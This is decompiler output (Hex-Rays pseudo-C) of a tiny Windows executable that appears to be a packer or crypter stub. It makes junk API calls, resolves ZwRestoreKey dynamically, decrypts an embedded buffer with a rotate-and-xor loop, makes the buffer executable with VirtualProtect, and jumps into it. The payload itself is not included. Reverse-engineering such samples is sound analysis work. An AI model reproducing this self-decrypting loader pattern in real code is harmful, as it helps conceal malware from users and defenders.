/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

void start();
void __stdcall sub_4257CC(_DWORD *a1, unsigned int a2, int a3);
// BOOL __stdcall CloseHandle(HANDLE hObject);
// FARPROC __stdcall GetProcAddress(HMODULE hModule, LPCSTR lpProcName);
// BOOL __stdcall VirtualProtect(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
// DWORD __stdcall SizeofResource(HMODULE hModule, HRSRC hResInfo);
// UINT __stdcall GetACP();
// DWORD __stdcall GetFileSize(HANDLE hFile, LPDWORD lpFileSizeHigh);
// DWORD __stdcall GetCurrentThreadId();
// DWORD __stdcall GetFileType(HANDLE hFile);
// HANDLE __stdcall CreateFileA(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// DWORD __stdcall GetCurrentProcessId();
// UINT __stdcall GetOEMCP();
// LPSTR __stdcall GetCommandLineA();
// HMODULE __stdcall LoadLibraryA(LPCSTR lpLibFileName);
// LPWSTR __stdcall GetCommandLineW();

//-------------------------------------------------------------------------
// Data declarations

_DWORD dword_42A000[9] =
{
  -1681198159,
  -61996277,
  253627845,
  1952220121,
  425815378,
  97497934,
  -245327103,
  -1176724317,
  2064291094
}; // idb
CHAR LibFileName[] = "ntdll.dll"; // idb
CHAR FileName[] = "eIi1.hC4"; // idb
CHAR aVqybZ8j[] = "VQYB.Z8J"; // idb
CHAR ProcName[] = "ZwRestoreKey"; // idb


//----- (00425597) --------------------------------------------------------
void start()
{
  FARPROC ZwRestoreKey; // eax
  unsigned __int16 v3; // dx
  HMODULE v4; // [esp-14h] [ebp-40h]
  int v5; // [esp-4h] [ebp-30h]
  HRSRC hResInfo; // [esp+10h] [ebp-1Ch]
  HANDLE hFile; // [esp+1Ch] [ebp-10h]
  DWORD flOldProtect[3]; // [esp+20h] [ebp-Ch] BYREF

  GetOEMCP();
  GetACP();
  v4 = LoadLibraryA(LibFileName);
  flOldProtect[2] = (DWORD)GetCommandLineA();
  GetOEMCP();
  ZwRestoreKey = GetProcAddress(v4, ProcName);
  v5 = ((int (__stdcall *)(_DWORD, _DWORD, _DWORD))ZwRestoreKey)(0, 0, 0);
  hResInfo = (HRSRC)CreateFileA(FileName, 0xC0000000, 1u, 0, 3u, 0xA3u, 0);
  hFile = CreateFileA(aVqybZ8j, 0xE0000000, 6u, 0, 3u, 0x26u, 0);
  GetCommandLineW();
  sub_4257CC(dword_42A000, 0x9401u, v5);
  GetCommandLineA();
  SizeofResource(0, hResInfo);
  CloseHandle(hResInfo);
  GetCurrentProcessId();
  GetFileType(hResInfo);
  GetCurrentProcessId();
  GetCommandLineA();
  VirtualProtect(dword_42A000, 0x9401u, 0x40u, flOldProtect);
  GetOEMCP();
  GetFileSize(hResInfo, 0);
  SizeofResource(0, hResInfo);
  GetOEMCP();
  GetCommandLineW();
  GetFileSize(hFile, 0);
  _AL = GetCurrentThreadId();
  __asm { daa }
  __outbyte(v3, _AL);
  JUMPOUT(0x42A029);
}
// 42A028: control flows out of bounds to 42A029
// 42A028: variable 'v3' is possibly undefined

//----- (004257CC) --------------------------------------------------------
void __stdcall sub_4257CC(_DWORD *a1, unsigned int a2, int a3)
{
  unsigned int v4; // esi

  v4 = a2 >> 2;
  do
  {
    *a1 -= a3;
    *a1 += 842938391;
    *a1 = __ROR4__(*a1, 171);
    *a1 = __ROL4__(*a1, 3);
    *a1 = -*a1;
    *a1 = __ROL4__(*a1, 170);
    *a1++ ^= 0x7F98E56Cu;
    --v4;
  }
  while ( v4 );
}
// 4257CC: could not find valid save-restore pair for ebx

// nfuncs=2 queued=2 decompiled=2 lumina nreq=0 worse=0 better=0
// ALL OK, 2 function(s) have been successfully decompiled
